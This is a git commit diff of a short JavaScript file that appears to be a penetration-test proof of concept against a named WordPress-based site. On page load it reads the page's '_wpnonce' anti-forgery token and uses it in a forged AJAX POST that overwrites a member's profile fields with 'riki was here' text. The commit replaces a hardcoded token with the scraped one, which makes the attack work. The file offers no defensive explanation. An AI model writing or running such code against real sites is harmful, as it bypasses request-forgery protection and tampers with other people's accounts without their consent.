0f96fd5a70daa6b91981615bc857d474e6688ed1
kamen-sketch <84771586+kamen-sketch@users.noreply.github.com>
2022-04-01 01:46:47 +0700

    Update change.js

--- change.js
+++ change.js
@@ -1,17 +1,19 @@
 
     $(document).ready(function(){
+        var x = document.getElementById("_wpnonce").value;
+        console.log(x);
         $.ajax({
             type: 'POST',
 
             url: 'https://baru.arkademi.com/members/pentest3/profile/edit/group/1/',
             data: {
-                "field_1": "riki + washing + here",
-                "field_12": "riki + washing + here",
-                "field_13": "riki + was + here",
-                "profile-group-edit-submit": "Save + Changes +",
-                "field_ids": "1, 12, 13",
-                "_wpnonce": "75b45a8856",
-                "_wp_http_referer": "/members/pentest2/profile/edit/group/1/"
+                "field_1": "riki washing here",
+                "field_12": "riki washing here",
+                "field_13": "riki was here",
+                "profile-group-edit-submit": "Save Changes +",
+                "field_ids": "1,12,13",
+                "_wpnonce": x,
+                "_wp_http_referer": "/members/pentest3/profile/edit/group/1/"
     },
             success: function (msg) {
                 alert('sukses!');
